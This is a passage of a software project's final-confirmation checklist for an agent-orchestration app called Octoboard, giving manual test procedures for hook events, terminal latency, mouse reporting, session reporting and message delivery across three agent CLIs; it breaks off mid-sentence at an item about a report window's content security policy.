# 05 Final confirmation

> Goal: close out the handful of checks that could not be made during development, so the MVP ships with nothing
> outstanding.
> Completion criteria: every item below has been exercised on a real build and has a recorded outcome; anything that
> fails is either fixed or written back into the plan as a deliberate limitation.

This milestone exists because a few confirmations are impossible until the real product exists or until an external
credential is available. They block nothing earlier — each was checked for that — so they are gathered here rather than
holding earlier work up. Keep it last.

**Before starting, have in hand:** a signed and notarized release build (several items need the real packaged `.dmg`,
not a dev build); all three agent CLIs (Claude Code, Codex, Grok Build) installed and logged in; a second macOS user
account or a genuinely separate clean machine (for the release-bundle item); the screen
unlocked and reachable for a real click (the report-panel item needs one, and nothing here can be scripted around
it); and the user's explicit authorisation to redirect Grok's chat endpoint to a local listener, re-confirmed at the
time (the `StopFailure` item) since it is separate from the general go-ahead for this milestone.

## Mid-task handoff

This round wrote the "How to run it" block (Setup / Steps / Pass criterion / What to record) under each of the 14
items below, so a person at the keyboard has a concrete procedure for each instead of just the one-paragraph claim.
It ran none of them: no item has been executed, nothing is ticked, and nothing below is verified — reading a "How to
run it" block as settled would be a mistake, it only means a route now exists.

## Carried over

Only what genuinely cannot be settled yet; everything else raised along the way was closed where it was raised.

- [ ] **Grok's `StopFailure`.** The only hook event of the three agents that was never captured from a live session; its
      payload shape is taken from Grok's own documentation. Provoking it means pointing Grok's chat endpoint at a server
      that returns an error, which redirects an authenticated client's traffic and so needs the user's explicit
      authorisation. Note Grok's "turn finished" mapping names this event, so that branch is unexercised.

      **How to run it**
      - **Setup**: a scratch directory as cwd, not `/tmp` (see `docs/memory/probing-agent-clis.md`). A console with a
        live hub session, with the **session** opted into reporting to it (`include_in_hub` is a per-session field,
        `daemon/src/protocol.rs:111`, set by `coordinator.rs:429` for hub-dispatched sessions or by the "Include in
        hub" checkbox at `app/src/components/SessionDialog.tsx:87-89` — not a project-level setting) — the `failed`
        outcome this item is checking for is not a session status at all, it is the *synthesised report* status,
        produced only for a session with `include_in_hub` **and** a live hub present in its console
        (`daemon/src/reporting.rs:237` checks `include_in_hub`, `:258` calls `deliver_report`, which at `:199-201`
        is where the live-hub lookup actually happens; the `Failed` status itself is assigned at `:250-251`). "Live"
        is this plan's gloss, not quite what the code enforces: `hub_session` (`:265-273`) returns a dormant or
        archived hub too, only sorting a live one first, and `deliver_report` applies no dormancy check of its own —
        so treat a genuinely live hub as good practice for this check, not as a requirement the code would refuse
        to work without. A plain hand-opened session, lacking `include_in_hub` altogether, cannot show the `failed`
        status either way.
        One more thing worth a warning while setting this up: the hand-edited hook script at
        `~/.octoboard/run/<session id>/hook` survives for that session's life (the scratch directory it lives in is
        wiped and recreated only at launch, `daemon/src/term.rs:92-99`, right before the script is written), but a
        resume or restart rewrites it, and the capture arrangement would silently vanish — do not resume or restart
        the session between editing the hook and provoking the failure. The script does not exist before the
        session's first launch, which is why the steps below dispatch it taskless first: editing the hook and then
        sending the task, rather than dispatching with a task and racing to edit the hook before the first (and, in
        this setup, immediately failing) chat call ends the turn. Re-confirm the authorisation this redirect
        needs — it is separate from the general go-ahead for this milestone. On this machine, read
        `~/.grok/docs/user-guide/26-config-reference.md` for the exact key that overrides Grok's chat endpoint; this
        repository does not pin that key down, so take it from the file, not from this plan.
      - **Steps**:
        1. Start a local HTTP listener on `127.0.0.1` that answers every request with an HTTP error status and prints
           the request body it received (a few lines of Python or Node are enough).
        2. In the scratch directory, point Grok at the listener using the key found in `26-config-reference.md`,
           before anything is launched against it. Doing this first, rather than after the session is already
           running, removes a dependency this plan cannot otherwise establish: whether Grok re-reads its config on
           every chat call or only at process startup. Most CLIs read config at startup; with the redirect already
           in place before launch, the first chat call hits the listener either way. Inference, not a recorded
           fact: if Grok's own startup depends on reaching the real endpoint (a login check, a model list fetch),
           redirecting before launch could make the launch itself fail rather than letting it start normally — if
           step 3 below fails to reach *awaiting instructions* at all, restore Grok's real endpoint, relaunch, and
           retry this item with the order from the previous version of this plan instead (listener → taskless
           dispatch → edit hook → redirect → send task), accepting that version's weaker assumption about
           re-reading config in its place.
        3. Through the hub, dispatch this session with `start_session` into a project rooted at the scratch directory
           (or open it by hand and tick "include in hub"), on Grok Build, with **no task** — per "Notes for
           developers" below, a taskless launch costs no model turn and still starts the process, which is what
           leaves the session sitting at its prompt with the hook script already written and nothing yet racing to
           close the turn. Wait for the session to read *awaiting instructions*.
        4. Find the session's id (from its row, or the hub's `start_session` return value) and edit its hook script
           at `~/.octoboard/run/<session id>/hook` — written per `write_hook_script` in `daemon/src/adapter/mod.rs`,
           the only interception point for a hook payload, since none of the three agents' payloads are logged
           (`daemon/src/hooks.rs` has no `tracing::` call at all, and `daemon/src/server.rs:277-292` logs only a
           failure path, at `debug`). The real line to edit is `exec '<absolute path to octoboardd>' hook --session
           '<session id>' --port <port> 2>/dev/null`, not a bare `exec octoboardd hook`; prefix
           `tee -a /tmp/octoboard-stopfailure-capture.jsonl |` to that same line (not on a line of its own — the
           script's own stderr redirect means a broken pipeline fails silently on every event, with nothing in the
           capture file and no error either), so every payload the session's hooks deliver is also captured on its
           way to the daemon.
        5. Send the session its task through the hub (`send_message`, or ask the hub to relay one), now that the
           hook is capturing. `UserPromptSubmit` is a hook and fires independently of the chat endpoint, so the
           turn still opens normally; it is the first chat call inside it, the one pointed at the listener since
           step 2, that fails. Let the turn run until that call fails against the listener.
        6. Regardless of how the above went — whether step 3 ever reached *awaiting instructions*, whether the
           chat call in step 5 actually failed the way it was meant to — restore Grok's chat endpoint to whatever
           the key held before step 2 changed it (unset it, or restore the prior value, matching however it was
           set), and stop the local listener from step 1. This is not conditional on the pass criterion below: the
           redirect needs undoing on every path through this item, not only the one where step 2's own fallback
           note already restores it.
      - **Pass criterion**: `/tmp/octoboard-stopfailure-capture.jsonl` contains a payload for a `StopFailure` event for
        that session (not a plain `Stop`), and the hub receives a synthesised report for it whose status is `failed`.
      - **Record**: the exact config key used and the Grok Build CLI version (per `docs/memory/probing-agent-clis.md`,
        anything taken from the on-disk docs is recorded next to its version), the captured payload shape from the
        tee'd file, whether the hub's synthesised report came through with status `failed`, whether the key was set
        project-local or user-level and via a config file or a `GROK_*` environment variable (so step 6 restores the
        right thing), and confirmation that the endpoint and the listener were both restored/stopped per step 6.

- [ ] **The end-to-end terminal latency the user actually perceives.** The daemon-to-WebSocket path measures well under a
      millisecond, but the rendering step on top of it can only be instrumented once the real application exists.

      **How to run it**
      - **Setup**: the packaged application, a session on its prompt (any agent), and a way to put both the keystroke
        and the screen in the same recording — a screen-only capture (QuickTime Player's "New Screen Recording") never
        shows the key press itself, so either film the screen and the physical keyboard together with a second camera
        (e.g. a phone, held steady, at the highest frame rate it offers, which must be at least 120 fps — a slower
        camera cannot resolve a gap this short at all), or run a keystroke-visualizer overlay that draws each press
        on screen underneath a plain screen recording captured at 120 fps or more.
      - **Steps**:
        1. Start the recording (the camera on screen plus keyboard, or the screen capture with the overlay running).
        2. Type a single distinctive character (something not already on screen) at a normal pace, several times with
           a pause between each.
        3. Scrub the recording frame by frame and count the frames between the visible keystroke (the finger's
           contact, or the overlay's own flash) and the character's first appearance in the terminal pane.
      - **Pass criterion**: no perceptible delay while typing normally, and the elapsed time between keystroke and
        character — converted from the *recording's* own frame rate, not the display's, since that is the rate the
        frames in step 3 were actually counted at — is at most 33 ms on top of the already-measured sub-millisecond
        daemon figure. This bound is not a requirement written down anywhere in the project's docs — it is this
        plan's own reading of "no perceptible delay" (two frames at a 60 Hz display, generous enough that a result
        on the margin does not need a second judgement call) — so file only a lag large enough to be seen with the
        naked eye.
      - **Record**: the frame count (and elapsed time) measured, the display's refresh rate, the *recording's* own
        frame rate (this is the number that actually converts a frame count to milliseconds — a phone filming at
        60 fps cannot resolve a 16 ms gap at all, so use a recording method that can sustain at least 120 fps, and
        record the actual rate achieved, not just the camera's rated maximum), which method put the keystroke into
        the recording, and a plain yes/no on whether typing felt instantaneous.

- [ ] **Mouse reporting past column 95.** The application forwards `xterm.js`'s `onBinary` events precisely so that a
      mouse report whose coordinate byte exceeds 127 still reaches the agent, and the forwarding was read line by line,
      but nothing available during development reacts to a click in a way that proves the report arrived — Claude Code's
      composer does not position its cursor by click. Confirm by using an agent TUI that does respond to the mouse, in a
      window wide enough to click past column 95, and check that the click lands where it was aimed.

      **How to run it**
      - **Setup**: a Grok Build project session — its bash-mode escape (`!`) is expected to drop into a plain shell
        inside the same PTY (confirm this by hand before relying on it: `docs/mvp.md` §5.3 establishes only that bash
        mode bypasses hooks and permissions, not that it is an interactive shell), which would be the easiest way to
        reach an agent-adjacent TUI that does respond to mouse clicks (`vim`). If it does not behave that way, or
        `vim` will not run there, this repository has no other established route to an agent-adjacent TUI that
        responds to mouse clicks — record that plainly rather than treating the check as settled.
      - **Steps**:
        1. Resize the Octoboard window to the full width of the screen so the terminal has well over 95 columns; run
           `!tput cols` to confirm the exact column count.
        2. Run `!printf '%s\n' "$(printf '%94s' '' | tr ' ' '.')95"` to print 94 dots followed by "95", so columns 95
           and 96 are identifiable on screen as the digits of "95" itself (a `seq 1 20` ruler only reaches 31
           characters and cannot mark a column this far out).
        3. Run `!vim scratch.txt`, then `:set mouse=a<CR>` if the click does not already position the cursor, and
           `:set ttymouse=xterm<CR>`. `xterm.js` advertises SGR mouse mode (1006), which vim's default
           `ttymouse=sgr` reports in plain decimal digits regardless of column — left at that default, this check
           could pass without ever exercising the byte-over-127 `onBinary` path the item exists to confirm, since
           that byte only arises under the legacy X10 encoding `ttymouse=xterm` selects. Confirm which is active with
           `:echo &ttymouse`.
        4. Click at a character position past column 95 (use the ruler from step 2 to aim).
      - **Pass criterion**: vim's cursor lands exactly on the clicked character, not at column 95 or wrapped to a
        different line, with `ttymouse` confirmed as `xterm` for the click counted as a pass.
      - **Record**: the window width / column count used, which `ttymouse` setting was active, and a screenshot or
        short description of the click and the resulting cursor position.

- [ ] **One full orchestration loop, with real model turns.** Dispatch a task to a project through the hub, let the
      session do it, and watch the report arrive in the hub, the session archive itself, and the hub summarize. Nothing
      in the loop has ever run a model turn, so the whole turn-level half of the status mapping is unexercised: `working`
      during a turn, `waiting_user` at a permission prompt, Grok's two `Stop` fires, Codex's `Interrupt`. Check along the
      way that each session's role description actually reached its model (a Claude Code hub's appended system prompt, a
      Codex hub's `developer_instructions`, a Grok session's `--rules`) and that a dispatched `brief` arrives as the
      session's opening prompt — Claude Code's `--mcp-config` is list-valued, so the task is passed ahead of every flag,
      and that ordering has only been shown to parse, not to reach the model. Then let a session stop without calling
      `report` and confirm the synthesised report reaches the hub exactly once, on all three agents.

      **How to run it**
      - **Setup**: one console per agent under test (so the hub's own agent varies), each with at least one scratch
        project. Repeat the whole run for each of the three hub agents, since the role-description sub-claim is
        per-agent. Separately, since the Record below wants per-agent outcomes for the *dispatched* session (the
        one `start_session` opens, whose agent comes from its project's default or an explicit `agent` argument —
        never from the hub's own agent), make sure the dispatched sessions across these runs actually span all
        three agents too: varying only the hub's agent while always dispatching onto the same one would leave the
        Record's per-agent columns looking complete while two-thirds of them were never exercised. Set at least one
        project's default agent, or pass an explicit `agent` argument to `start_session`, so each of Claude Code,
        Codex and Grok Build is dispatched into at least once across the three runs.
      - **Steps**:
        1. Open the hub and give it a real request, e.g. "use `start_session` to ask `<project>` to create a file
           called `confirm.txt` containing the word hello, then report when done."
        2. While the dispatched session runs, watch its row: it should read `working` during the turn. Give it a task
           that needs a permission decision (a shell command outside what is pre-approved) to see `waiting_user`; for
           Codex specifically, interrupt a running turn with `Ctrl+C` and watch for the `Interrupt` mapping; for Grok,
           let one ordinary turn finish and confirm its `Stop` with `reason: "end_turn"` moves the status. Then, for
           that same Grok session, archive or otherwise stop it so its second `Stop` fires too — at teardown
           (`SIGTERM`), with `reason: "shutdown"` (`daemon/src/hooks.rs:11-12`, `docs/mvp.md:265-267`), since
           finishing only one ordinary turn produces a single `Stop` and nothing to filter against; observe what
           this second `Stop` does to the status and whether it produces a phantom synthesised report. This is
           recorded, not graded: the session is already dormant (`Interrupted` or `Archived`) before teardown's
           `Stop` lands, and both `apply_hook_status` (`daemon/src/state.rs:241-243`) and `deliver_report`
           (`daemon/src/reporting.rs:195-197`) refuse to act on a dormant session regardless of whether the
           `reason: "shutdown"` filter this item exists to confirm is even present — so neither outcome tells a
           working filter apart from a daemon that dropped it.
        3. Ask the hub directly ("what is your role, and what tools do you have") to confirm the injected role
           description reached the model, rather than only being present in the launch arguments.
        4. Open the dispatched session's own terminal and scroll back to its opening prompt; confirm the `## Goal` /
           `## Context` / `## Acceptance` / `## Constraints` headings from the brief are there, in that order, with any
           field the hub omitted missing entirely (not an empty heading).
        5. Let one dispatched session finish with `report(status: done)` and no open items; confirm the hub receives
           the report and the session archives itself automatically.
        6. Dispatch a second session and let its turn end without it calling `report` at all (ask it to just answer in
           plain prose); confirm a synthesised report reaches the hub, naming the session as having stopped without
           reporting. Repeat this sub-step once per agent.
      - **Pass criterion**: every status transition above matches `docs/product/sessions.md`'s table; the role
        description is demonstrably known to the model, not just passed as a flag; the brief's headings appear verbatim
        and in order; a `done` report with no open items archives the session; a turn that never calls `report` still
        produces a synthesised report, on each of the three agents. Grok's teardown `Stop` is not part of this: the
        dormancy guards noted in step 2 above mean it cannot move the status or produce a phantom report either way,
        so nothing here grades on it.
      - **Record**: one table, a row per agent (Claude Code / Codex / Grok Build), columns for: role description
        reached the model (yes/no + what it said), brief headings appeared correctly (yes/no), status transitions
        observed matched the mapping (notes on any miss), and the stop-without-report outcome (synthesised report
        received, the status Octoboard assigned it, and whether it said plainly that the session did not report).
        For Grok specifically, also record what the teardown `Stop` was observed to do (expected: nothing, by
        construction, per step 2) — this is a note for whoever reads the record later, not evidence the
        `reason: "shutdown"` filter (`daemon/src/hooks.rs:11-13`) actually works, since the dormancy guards in
        `apply_hook_status` and `deliver_report` would mask its absence just the same.

- [ ] **Several sessions raising their hand at once.** Confirm the hands bubble up to the right project and console rows
      without interfering, that one system notification fires per session entering the state, that the Dock badge tracks
      the count and clears, and that answering in the terminal clears the hand. Needs a person: scripted key injection
      bypasses the permission dialog this is about.

      **How to run it**
      - **Setup**: three project sessions open at once, ideally spread across two or three different projects/consoles
        so the "right project and console rows" part of the claim is actually exercised; macOS notification permission
        granted to Octoboard. Name the agents rather than leaving the choice open: use Claude Code and/or Grok Build
        for at least two of the three, since both reliably raise a hand on a permission prompt. If a Codex session is
        one of the three, first confirm the setting Octoboard actually reads is not one that resolves approvals by
        itself — that is not Codex's `approval_policy` / `--ask-for-approval`, which Octoboard never looks at, but
        the key `approvals_reviewer` in `$CODEX_HOME/config.toml`, read for a value containing the string
        `auto_review` (`daemon/src/adapter/codex.rs:153-167`); where it does, Octoboard raises no hand at all for
        that session (`docs/product/sessions.md:156-159`; the plain-prose case at `:129-130` is a separate gap with
        the same symptom) — otherwise a Codex session that never raises its hand reads as this check having failed
        when it is only Codex's own configuration doing what it was told.
      - **Steps**:
        1. In each of the three sessions, within a short span of each other, type a task that triggers a permission
           prompt the agent is not pre-approved for (e.g. a shell command outside its allow rules).
        2. Observe, for all three at once: the raised-hand icon on the session row and on its project row and console
           row; one macOS notification per session, each naming that session's title and its project (or console, for
           a hub); the Dock badge reading 3.
        3. Answer one session's prompt directly in its terminal. Confirm its hand clears at all three row levels and
           the Dock badge drops to 2.
        4. Give that same session another task that raises a second permission prompt. Confirm a fresh notification
           fires for it (the earlier answer does not suppress a later one).
      - **Pass criterion**: all three sessions show correctly scoped icons with no cross-session interference, exactly
        one notification per hand raised, the Dock badge count is accurate at every step, and answering clears the hand
        without affecting the other two sessions.
      - **Record**: a table, one row per session (title / project), with columns for: time the hand was raised,
        notification seen (yes/no), icon visible at session/project/console level (yes/no each), time answered, and the
        Dock badge count immediately before and after each step.

- [ ] **Whether Grok's `idle_prompt` fires exactly once per ending.** The daemon arms exactly one
      clock-attributed turn end per ending and spends it on the next `idle_prompt`, which is what
      keeps an echo of a finished turn from closing the turn running now. Two halves of that premise
      are unestablished, and failing either reintroduces the mis-attribution: that the backstop does
      not *repeat* while a session stays idle (a second echo arriving during a long quiet tool call
      would be read as that call's turn ending), and that it fires *at all* when new work starts
      inside the roughly 60-second delay (if it does not, the armed echo is spent on a later turn —
      and if that turn is one of the kinds Grok reports no stop event for at all, its own `idle_prompt`
      is swallowed and the turn never closes). Check both: leave a Grok session idle well past the
      delay and count the fires, then dispatch new work within the delay and see whether the previous
      ending's backstop still arrives.

      **How to run it**
      - **Setup**: a Grok Build project session, a stopwatch, the session's row visible so its status icon can be
        watched, and a capture of the session's raw hook payloads running for the whole item, not only at the end:
        right after the session first reaches *awaiting instructions*, and before step 1, edit its hook script the
        same way the `StopFailure` item's step 4 does — prefix `tee -a /tmp/octoboard-idleprompt-capture.jsonl |` to
        its `exec … hook …` line, on that same line (the trailing pipe is not optional: without it `tee` takes `exec`,
        the daemon's own path and `hook` as further output files and overwrites the binary instead of running it). In
        a separate terminal, `touch /tmp/octoboard-idleprompt-capture.jsonl` so the file exists before watching it —
        `tail -f` on a file that does not exist yet prints "No such file or directory" and exits immediately, taking
        the whole pipeline with it, and that file would not otherwise exist until the hook's first write, which is
        ending 1's own backstop — then run `tail -f /tmp/octoboard-idleprompt-capture.jsonl | while read -r line; do
        echo "$(date +%T) $line"; done` to watch it with its arrival time attached rather than reading it cold
        afterwards. If this watch is ever stopped and restarted against a file that already holds lines (e.g. between
        repeated runs of steps 1–4, per the Record below), `tail -f` replays its last ten lines immediately, stamped
        with the time the watch restarted rather than when they actually arrived — conservatively late, so it cannot
        fake a quiet stretch, but worth knowing before trusting a timestamp seen right when a restarted watch starts.
        There is no log line for this event (see `daemon/src/hooks.rs`), and the session row's own status is not
        enough on its own either — see the Pass criterion below for what this capture is needed for; it is
        load-bearing from the start of the item, not only for the observational step at the end. The risk this
        item is about is gated on `BACKSTOP_QUIET` (45 s, `daemon/src/hooks.rs:185`): a stale `idle_prompt`
        echo lands on whichever turn is currently open and is either spent harmlessly on it (if that ending's echo
        is still pending, `daemon/src/state.rs:368-370`) or, once no echo is pending, read as closing it outright
        once it has itself produced no event for 45 s (`close_turn` in `daemon/src/state.rs`) — which a turn
        genuinely still working through a long, silent tool call also satisfies. Making the mis-attribution risk
        visible needs exactly that kind of turn, opened while the previous ending's echo is still in flight, not a
        bash-mode escape: bash mode bypasses hooks entirely, so it never opens a turn the daemon can see "flipping"
        in the first place, and so proves nothing about this mechanism either way. The row cannot settle what bash
        mode is doing in step 5 below either: `apply_hook_status` returns early whenever the
        reported status already matches the session's current one (`daemon/src/state.rs:239-246`), and an
        `idle_prompt` arriving on an already-idle session maps to the status it is already at — so "bash mode sent
        no backstop" and "it sent one the row had nothing to show for" look identical from the row alone, which is
        why step 5 reads the capture rather than the row for that part. The goal above also calls for leaving a
        session idle well past the delay and counting the fires on its
        own; that half is not given a separate step, because a genuinely idle session has nowhere to show it: a
        repeat backstop against an already-closed turn is spent silently (`close_turn` returns `NoTurn` without
        touching the session, `daemon/src/state.rs:361-364`), and `apply_hook_status` would no-op on a session
        already idle even if one were somehow forwarded (`daemon/src/state.rs:239-246`) — so the repeat half below
        is tested inside the open turn from step 2 instead, where a repeat does have a status to flip. Pre-approve
        whatever shell tool call step 2 uses for its 180 s sleep (or otherwise make sure it needs no permission
        decision) before starting: a permission prompt there would park the session at `waiting_user`, where
        `read_turn_boundary` (`daemon/src/server.rs:320-331`) discards any backstop outright without touching the
        turn — masking a deleted guard by a third route, on top of the two the item itself exists to rule out. A
        `waiting_user` reading at any point during step 3's watch invalidates that run; redo it with the command
        pre-approved.
      - **Steps**:
        1. Run one ordinary task to completion, to see the normal (fast) `working` → `idle` transition as a
           baseline; this also arms that ending's `idle_prompt` echo (call this **ending 1**).
        2. Have the next prompt pre-composed before ending 1 lands, and send it the moment the row flips to idle
           for ending 1: a shell tool call whose first action sleeps 180 seconds before producing any output, so
           the turn it opens stays silent for three ~60 s backstop intervals rather than one. Call **δ** the interval
           from ending 1 to the moment the new turn falls silent — and read it from the capture, not a stopwatch: it
           is the gap between ending 1's `Stop` payload and the sleeping tool call's own `PreToolUse` payload. It is
           that `PreToolUse`, not the prompt, that anchors the budget, because every hook event which is not a turn
           boundary calls `touch_turn` (`daemon/src/server.rs:346-350` → `state.rs:307-311`) and so restarts the
           turn's quiet clock where it lands; `PreToolUse` is one of Grok's registered events
           (`daemon/src/adapter/grok.rs:50-61`) and is not a boundary — `turn_end` has no `PreToolUse` case at all,
           and `hooks.rs` maps it to `Working` for every tool but `ask_user_question`. So δ
           absorbs both how long you took to send the prompt and the model latency before it issued the tool call,
           and watching only the send time understates it.
           δ is the whole timing budget this item depends on, not an incidental detail: `turn_started`
           (`daemon/src/state.rs:283-289`) never clears the echo armed by ending 1, so that echo survives into this
           new turn — but whether Grok's backstop for ending 1 actually arrives, and when, is Grok's own behaviour,
           not the daemon's, and is nowhere established in this repository (`docs/mvp.md:277-279` says only "about
           60 s after the turn ends"); the capture from Setup is what confirms it for this run rather than this
           plan assuming it (see the Pass criterion below) — but `close_turn`
           only reads a stale echo as closing this turn once the turn's own quiet clock has reached `BACKSTOP_QUIET`
           (45 s, `daemon/src/hooks.rs:185`), and that clock starts where δ ends. The echo can only
           catch a deleted guard while 60 − δ ≥ 45, i.e. **δ ≤ ~15 s** — and with the backstop's own "about 60 s"
           jitter, the real budget is nearer 10 s. **If δ turns out to exceed about 15 s, this run is void**: redo
           it rather than recording whatever step 3 showed, since a run that slow cannot tell a correct daemon from
           one with the echo guard deleted. This opens a new turn while ending 1's echo is still pending, and keeps
           it open and quiet for three ~60 s backstop intervals rather than one — both halves of the goal need that
           span: whether a stale echo gets mis-attributed to this turn at all, and whether a *second* firing of
           ending 1's backstop, if Grok ever sends one, also gets through once the first has already been spent on
           the still-pending echo.
        3. Watch the row for the whole 180 s of that silent tool call: it should read `working` throughout, with no
           flip to *awaiting instructions* at any point — not only around the ~60 s mark measured from ending 1, but
           through the ~120 s and ~180 s marks too. A flip at ~60 s would mean ending 1's `idle_prompt` was
           mis-attributed to this still-open, still-quiet turn instead of being spent harmlessly on the pending
           echo. A flip at ~120 s or ~180 s, with no turn actually ending at that point, would mean a second firing
           of ending 1's backstop got through after the first had already consumed it — the repeat half of the
           goal. Watch the capture for the same span: ending 1's `idle_prompt` payload should appear in it,
           timestamped near the ~60 s mark, whether or not the row ever flips — its presence there is what makes
           this run conclusive at all (see the Pass criterion below); its absence means Grok's backstop never
           reached the daemon this run, and the run should be redone rather than trusted on a quiet row alone.
        4. Once that tool call finishes and the turn ends normally, confirm the row reads *awaiting instructions*
           exactly once for it (call this **ending 2**), with no earlier or duplicate flip.
        5. Separately from the above, and not load-bearing for the pass criterion below beyond what Setup already
           requires: the capture has been running since before step 1, so ending 2 (the turn that closed normally
           in step 4) arms its own `idle_prompt` echo exactly the same way ending 1 did, and that echo is due to
           land in the same capture file on its own, roughly 60 s after ending 2 — before triggering anything new,
           wait for it. Its arrival is a second positive control, on top of ending 1's: it proves the tee is still
           live and feeding the file this far into the run, which nothing else here confirms (a capture that
           stayed empty from here on could equally mean a broken pipe as "bash mode sends nothing"). Note the
           clock time it lands at, then confirm the file goes quiet — no further payload — for a stretch at least
           as long as the backstop's own ~60 s delay. Only once the file has gone quiet after that sighting, run
           `!sleep 1 && echo done` (Grok's bash-mode escape) once from idle, and watch for roughly 70 s for a *new*
           payload landing after the quiet stretch. This is a chance to observe something nobody has watched for
           from a live session: whether bash mode's escape produces an `idle_prompt` backstop of its own despite
           bypassing every other hook. A `Notification`/`idle_prompt` payload appearing after the quiet stretch
           would side with `docs/mvp.md:277-279`, which lists bash mode among the turns that "produce no stop event
           at all" and names `idle_prompt` as their backstop; no such payload at all, with the file's liveness
           already confirmed by ending 1's and ending 2's positive controls, would side with
           `docs/product/sessions.md:133`, which says bash mode "produces no events" outright. Do not pick a side —
           just record which one happened.
      - **Pass criterion**: this run only counts at all if the capture from Setup shows a payload for ending 1's
        `idle_prompt` arriving during the 180 s window opened by step 2 (step 3) — that arrival is what makes
        ending 1's backstop a live signal for this run rather than an assumption. If it does not appear, the run is
        **inconclusive** for the echo-guard half (a quiet row proves nothing without a backstop having actually
        been sent to test it against), and the goal's second half — that the backstop fires at all when new work
        starts inside the delay — has **failed** for this run regardless of what step 3's row showed; redo the run
        rather than scoring it either way. For a run where that payload is seen: δ (step 2) was at most about 15 s
        for the run being counted — equivalently, the capture shows at least 45 s between the sleeping tool call's
        `PreToolUse` and the arrival of ending 1's `idle_prompt`, which is the comparison the daemon itself makes;
        a run failing that is void and must be redone, not scored either way — and, for a run satisfying it, no spurious flip at any point during the 180 s silent
        tool call opened in step 2 (step 3) — neither around the ~60 s mark (the echo-guard half of the goal) nor
        around ~120 s or ~180 s (the no-repeat half) — and the only flips observed are the ones that correspond to
        a turn actually ending (steps 1 and 4), each exactly once. Step 5 is observational and has no pass/fail of
        its own.
      - **Record**: whether ending 1's `idle_prompt` payload appeared in the capture during step 2's window, and
        the clock time it landed at if so (mark the run inconclusive per the Pass criterion if it did not); the
        measured δ for each run, read from the capture as the gap between ending 1's `Stop` and the sleeping tool
        call's `PreToolUse` (void the run and redo it if δ exceeds about 15 s); timestamps of
        every transition observed in steps 1–4, including the clock time of the ~60 s, ~120 s and ~180 s marks
        during step 3's watch so any flip can be matched to the mark it landed on; whether any flip occurred during
        the silent tool call in step 3 (expect none, at any of the three marks); and whether the transition in
        step 4 happened exactly once with no earlier duplicate. Repeat steps 1–4 two or three times — this is
        timing-sensitive and a single run proves less than a few. Separately, record step 5's outcome — the clock
        time ending 2's own backstop landed in the capture file (the second positive control), confirmation the
        file then went quiet for a full backstop interval before the bash-mode escape was tried, and whether a new
        payload appeared afterward — and state plainly whether it supports `docs/mvp.md:277-279` or
        `docs/product/sessions.md:133`, so whoever resumes can fix the losing one.

- [ ] **A message the agent only half accepts.** When a PTY write is accepted in part and then times
      out, Octoboard drops that message and everything queued behind it, tells the sender, and shows
      the user a notice naming the session — and then writes into the session again as normal,
      because what the input line is actually left holding, and what clears it, is established for
      none of the three agents. The design assumes only that the next write closes the leftover
      fragment and is submitted with it, which bounds the damage at one spoiled message; that
      assumption is the bracketed-paste contract the rest of the mechanism already rests on, but it
      has not been seen happen. Provoke a partial write (a TUI held at a modal under a large paste is
      the likeliest route) and record, for each agent, what the line ends up holding, what the next
      message looks like when it arrives, and whether anything worse than one spoiled prompt follows.
      If something worse does, that is when a refuse-until-clean rule earns its keep — and the
      signal it would need has to be found first.

      **How to run it**
      - **Setup**: one project session per agent (three in total), each with a hub able to call `send_message` on it
        (so the write goes through Octoboard's own path, not a hand-typed paste).
      - **Steps**:
        1. Put the session into a state likely to stall mid-write: trigger a trust/approval modal (e.g. an untrusted
           Claude Code directory, or an approval Codex/Grok would otherwise ask about) right as a large (several-KB)
           message is sent into it with `send_message` — the PTY's roughly 1022-byte write buffer (see `docs/mvp.md`
           §6) is what makes a large paste the likeliest way to catch a write mid-flight.
        2. If the first attempt does not produce a dropped-message notice, repeat with a larger payload or a modal that
           appears partway through typing rather than before it. Note how many attempts it took, including attempts
           that did not reproduce it.
        3. Once a drop is reported (the sender is told it was dropped; the user sees a notice naming the session):
           inspect the session's terminal input line immediately — what text, if any, sits there unsent.
        4. Send one more ordinary message into the session and watch what actually gets submitted — is the leftover
           fragment prefixed to it, or did the line start clean.
        5. Continue using the session normally for a few more turns and note whether anything beyond that one spoiled
           message misbehaves.
      - **Pass criterion**: for every agent where a partial write was reproduced, the next write closes the leftover
        fragment and both are submitted together (the one-spoiled-message assumption holds); for an agent where it
        could not be reproduced within a reasonable number of attempts, record that plainly rather than treating it as
        confirmed either way.
      - **Record**: a table, one row per agent (Claude Code / Codex / Grok Build), columns for: attempts needed to
        reproduce (or "not reproduced in N attempts"), what the input line held right after the drop, what the next
        message looked like on arrival, and whether anything worse than the one spoiled prompt followed.

- [ ] **An instruction handed to a reopened session.** `reopen_session` with a `text` queues it and lets the agent's own
      first reported state release it, rather than writing into a process that has only just started. Confirm it is
      released once the agent is actually at its prompt, and in particular that a Claude Code session reopened in a
      directory it has not been trusted with does not have the queued text answer its trust dialog — nothing establishes
      whether its `SessionStart` fires before or after that dialog.

      **How to run it**
      - **Setup**: a Claude Code project session in a directory this Claude Code installation has never been trusted
        with (check `~/.claude.json`'s `projects["<path>"].hasTrustDialogAccepted` is absent or `false` for that path,
        or simply pick a directory never opened in Claude Code before). Start a session there, then archive or
        interrupt it without accepting the trust dialog, if it ever appeared — if it appears on first open, leave it
        unanswered and interrupt via a plain Octoboard quit instead of answering it. Note down which of the two
        happened before moving on: the session never reached a prompt at all (trust dialog never appeared, or it did
        and was left unanswered), versus it reached one and was then archived or interrupted anyway — these are
        materially different starting states for `reopen_session` and are not otherwise distinguishable from the
        record below.
      - **Steps**:
        1. Through the hub, ask it to call `reopen_session` on that session's id with a `text` instruction, e.g.
           "please reopen session `<id>` with the text 'confirm you are ready'".
        2. Watch the terminal the moment the process relaunches: Claude Code should show its folder-trust dialog first.
        3. Confirm the trust dialog is not itself answered by the queued text — it should stay up, unaffected, rather
           than closing or having an option pre-selected.
        4. Answer the trust dialog by hand (accept it).
        5. Confirm the queued instruction appears and is submitted only after that — at the agent's real, ready prompt,
           not stacked into the trust dialog's own input.
      - **Pass criterion**: the queued text never touches the trust dialog, and it is delivered exactly once, after the
        trust decision and once the agent is genuinely ready for input.
      - **Record**: whether the trust dialog appeared at all for this fresh directory, whether it was visibly affected
        by the queued text, and when — relative to answering the trust dialog — the instruction actually appeared in
        the terminal. Note the project path used, so a re-run can start from the same known-untrusted state, and
        which starting state the Setup's own session ended in — never reached a prompt, or reached one and was
        stopped anyway — before `reopen_session` was called on it.

- [ ] **Whether a report page can push data out through a channel CSP does not reach.** The window's policy closes the
